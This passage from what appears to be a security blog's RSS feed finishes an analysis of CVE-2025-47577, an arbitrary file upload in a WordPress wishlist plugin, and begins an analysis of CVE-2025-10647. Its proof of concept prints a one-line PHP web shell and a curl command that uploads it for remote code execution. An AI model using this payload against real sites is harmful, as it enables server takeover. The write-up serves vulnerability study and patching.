{&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;$file[&amp;#39;tmp_name&amp;#39;] = $upload[&amp;#39;file&amp;#39;];&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;$meta[ $name ]    = json_encode( array_merge( $upload, $file ) );&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;return $meta;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It only runs if the &lt;strong&gt;WC Fields Factory (wcff)&lt;/strong&gt; plugin is active — because that plugin defines the &lt;code&gt;wcff()&lt;/code&gt; function (found by searching for &lt;code&gt;function wcff(&lt;/code&gt; in the plugins directory).&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-07-cve-2025-47577/wcff.png&#34; title=&#34;Where wcff() is defined&#34; data-thumbnail=&#34;/posts/2025-11-07-cve-2025-47577/wcff.png&#34; data-sub-html=&#34;&lt;h2&gt;wcff&lt;/h2&gt;&lt;p&gt;Where wcff() is defined&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-07-cve-2025-47577/wcff.png&#39; alt=&#34;wcff&#34; height=&#34;407&#34; width=&#34;1220&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Where wcff() is defined&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;We see that &lt;code&gt;wcff()&lt;/code&gt; is defined by the &lt;strong&gt;WC Fields Factory (wcff)&lt;/strong&gt; plugin.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( array_key_exists( $name, $meta ) ) { ... }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It only processes if the file name (&lt;code&gt;$name&lt;/code&gt;) matches a key in &lt;code&gt;$meta&lt;/code&gt; (i.e., a valid form field).&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$upload = tinvwl_upload_file_wc_fields_factory( $file );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Calls &lt;code&gt;tinvwl_upload_file_wc_fields_factory()&lt;/code&gt; to upload the file to the server.&lt;/p&gt;&#xA;&lt;p&gt;The function &lt;code&gt;tinvwl_meta_wc_fields_factory()&lt;/code&gt; is registered as a callback for a filter:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_filter( &amp;#39;tinvwl_addtowishlist_prepare_form&amp;#39;, &amp;#39;tinvwl_meta_wc_fields_factory&amp;#39;, 10, 3 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Meaning when &lt;code&gt;apply_filters( &#39;tinvwl_addtowishlist_prepare_form&#39;,...)&lt;/code&gt; is invoked, &lt;code&gt;tinvwl_meta_wc_fields_factory()&lt;/code&gt; is called.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;tinvwl_addtowishlist_prepare_form&lt;/code&gt; filter is applied within &lt;code&gt;add_to_wishlist()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function add_to_wishlist() {&#xA;    if ( is_null( filter_input( INPUT_POST, &amp;#39;tinv_wishlist_id&amp;#39; ) ) ) {&#xA;        return false;&#xA;    } else {&#xA;        remove_action( &amp;#39;init&amp;#39;, &amp;#39;woocommerce_add_to_cart_action&amp;#39; );&#xA;        remove_action( &amp;#39;wp_loaded&amp;#39;, &amp;#39;WC_Form_Handler::add_to_cart_action&amp;#39;, 20 );&#xA;    }&#xA;    ob_start();&#xA;    $post = filter_input_array( INPUT_POST, array(&#xA;        &amp;#39;tinv_wishlist_id&amp;#39;   =&amp;gt; FILTER_VALIDATE_INT,&#xA;        &amp;#39;tinv_wishlist_name&amp;#39; =&amp;gt; FILTER_SANITIZE_FULL_SPECIAL_CHARS,&#xA;        &amp;#39;product_id&amp;#39;         =&amp;gt; FILTER_VALIDATE_INT,&#xA;        &amp;#39;product_variation&amp;#39;  =&amp;gt; FILTER_VALIDATE_INT,&#xA;        &amp;#39;product_type&amp;#39;       =&amp;gt; FILTER_SANITIZE_FULL_SPECIAL_CHARS,&#xA;        &amp;#39;product_action&amp;#39;     =&amp;gt; FILTER_SANITIZE_FULL_SPECIAL_CHARS,&#xA;        &amp;#39;redirect&amp;#39;           =&amp;gt; FILTER_SANITIZE_URL,&#xA;    ) );&#xA;&#xA;    $post[&amp;#39;original_product_id&amp;#39;] = $post[&amp;#39;product_id&amp;#39;];&#xA;&#xA;    $wlp      = null;&#xA;    $wishlist = null;&#xA;    $data     = array( &amp;#39;msg&amp;#39; =&amp;gt; array() );&#xA;    ...&#xA;&#xA;    $status = true;&#xA;    if ( empty( $post[&amp;#39;product_id&amp;#39;] ) || apply_filters( &amp;#39;tinvwl_addtowishlist_not_allowed&amp;#39;, false, $post ) ) {&#xA;        $status        = false;&#xA;        $data[&amp;#39;msg&amp;#39;][] = __( &amp;#39;Something went wrong&amp;#39;, &amp;#39;ti-woocommerce-wishlist&amp;#39; );&#xA;    } else {&#xA;        $post[&amp;#39;product_type&amp;#39;] = apply_filters( &amp;#39;tinvwl_addtowishlist_modify_type&amp;#39;, $post[&amp;#39;product_type&amp;#39;], $post );&#xA;        $post                 = apply_filters( &amp;#39;tinvwl_addtowishlist_prepare&amp;#39;, $post );&#xA;        $form                 = apply_filters( &amp;#39;tinvwl_addtowishlist_prepare_form&amp;#39;, filter_input( INPUT_POST, &amp;#39;form&amp;#39;, FILTER_DEFAULT, FILTER_FORCE_ARRAY ), $_POST, $_FILES );&#xA;        ...&#xA;    } &#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Conditions required for the filter logic to run:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The POST request must include the &lt;code&gt;tinv_wishlist_id&lt;/code&gt; parameter.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;product_id&lt;/code&gt; must exist and the filter &lt;code&gt;tinvwl_addtowishlist_not_allowed&lt;/code&gt; must remain &lt;code&gt;false&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;The filter &lt;code&gt;tinvwl_addtowishlist_not_allowed&lt;/code&gt; defaults to &lt;code&gt;false&lt;/code&gt; — searching the codebase found no places that alter it.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-07-cve-2025-47577/filter.png&#34; title=&#34;tinvwl_addtowishlist_not_allowed remains false&#34; data-thumbnail=&#34;/posts/2025-11-07-cve-2025-47577/filter.png&#34; data-sub-html=&#34;&lt;h2&gt;Filter&lt;/h2&gt;&lt;p&gt;tinvwl_addtowishlist_not_allowed remains false&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-07-cve-2025-47577/filter.png&#39; alt=&#34;Filter&#34; height=&#34;330&#34; width=&#34;1689&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;tinvwl_addtowishlist_not_allowed remains false&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;add_to_wishlist()&lt;/code&gt; is registered as a callback for an action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_loaded&amp;#39;, array( $this, &amp;#39;add_to_wishlist&amp;#39; ), 0 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So &lt;code&gt;add_to_wishlist&lt;/code&gt; runs on every request.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;HTTP POST (tinv_wishlist_id, product_id, form[...] &amp;#43; file)&amp;#34;] --&amp;gt; B[&amp;#34;wp_loaded → add_to_wishlist()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;apply_filters(&amp;#39;tinvwl_addtowishlist_prepare_form&amp;#39;, $_POST[&amp;#39;form&amp;#39;], $_POST, $_FILES)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;tinvwl_meta_wc_fields_factory($meta, $post, $files)&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;foreach $files as $name =&amp;gt; $file&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;if array_key_exists($name, $meta)&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;tinvwl_upload_file_wc_fields_factory($file)&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;wp_handle_upload($file, [&amp;#39;test_form&amp;#39;=&amp;gt;false, &amp;#39;test_type&amp;#39;=&amp;gt;false])&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;_wp_handle_upload() — MIME checks skipped&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;File written to /wp-content/uploads → possible RCE&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a &lt;code&gt;.php&lt;/code&gt; file containing a web shell:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]) ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Send a POST request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST &amp;#34;http://localhost&amp;#34; -F &amp;#34;tinv_wishlist_id=1&amp;#34; -F &amp;#34;product_id=1&amp;#34; -F &amp;#34;form[image]=1&amp;#34; -F &amp;#34;image=@rce.php&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;RCE via file upload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-07-cve-2025-47577/result.png&#34; title=&#34;RCE via file upload&#34; data-thumbnail=&#34;/posts/2025-11-07-cve-2025-47577/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE via file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-07-cve-2025-47577/result.png&#39; alt=&#34;Result&#34; height=&#34;348&#34; width=&#34;559&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE via file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-47577&lt;/strong&gt; vulnerability originates from &lt;strong&gt;disabling MIME type checks (&lt;code&gt;test_type =&amp;gt; false&lt;/code&gt;)&lt;/strong&gt; in the &lt;code&gt;wp_handle_upload()&lt;/code&gt; call, allowing an attacker to upload arbitrary files, including &lt;strong&gt;malicious PHP code&lt;/strong&gt;. Once a file is uploaded into &lt;code&gt;/wp-content/uploads/&lt;/code&gt;, it may be directly accessible and used to execute remote code (RCE). The 2.10.0 patch restores MIME checking, ensuring only file types listed in WordPress&amp;rsquo;s whitelist are allowed for upload.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Always enforce &lt;strong&gt;MIME type&lt;/strong&gt; and &lt;strong&gt;file extension&lt;/strong&gt; checks when handling uploads.&lt;/li&gt;&#xA;&lt;li&gt;Do not &lt;strong&gt;override WordPress&amp;rsquo;s default security mechanisms&lt;/strong&gt; such as &lt;code&gt;test_type&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;When analyzing vulnerabilities, &lt;strong&gt;comparing patch diffs&lt;/strong&gt; quickly reveals the root cause.&lt;/li&gt;&#xA;&lt;li&gt;Plugin developers should regularly &lt;strong&gt;audit hooks and filters related to uploads&lt;/strong&gt; to prevent RCE risks.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ti-woocommerce-wishlist/vulnerability/wordpress-ti-woocommerce-wishlist-2-9-2-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TI WooCommerce Wishlist Plugin &amp;lt;= 2.9.2 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10647 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-06-cve-2025-10647/</link>
      <pubDate>Thu, 06 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-06-cve-2025-10647/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-06-cve-2025-10647/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Embed PDF for WPForms&lt;/strong&gt; plugin for &lt;strong&gt;WordPress&lt;/strong&gt; contains a vulnerability that allows &lt;strong&gt;arbitrary file uploads&lt;/strong&gt; due to missing file type checks in the &lt;code&gt;ajax_handler_download_pdf_media&lt;/code&gt; function in all versions up to and including &lt;strong&gt;1.1.5&lt;/strong&gt;. This allows an authenticated attacker with access level &lt;strong&gt;Subscriber&lt;/strong&gt; or higher to upload arbitrary files to the affected site&amp;rsquo;s server, which may lead to &lt;strong&gt;remote code execution&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10647&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10647&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.1.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/embed-pdf-wpforms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Embed PDF for WPForms Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Embed PDF for WPForms&lt;/strong&gt;: &lt;strong&gt;1.1.5&lt;/strong&gt; (vulnerable) and &lt;strong&gt;1.1.6&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool to inspect and compare differences between versions.&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/wpforms-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WPForms Plugin&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 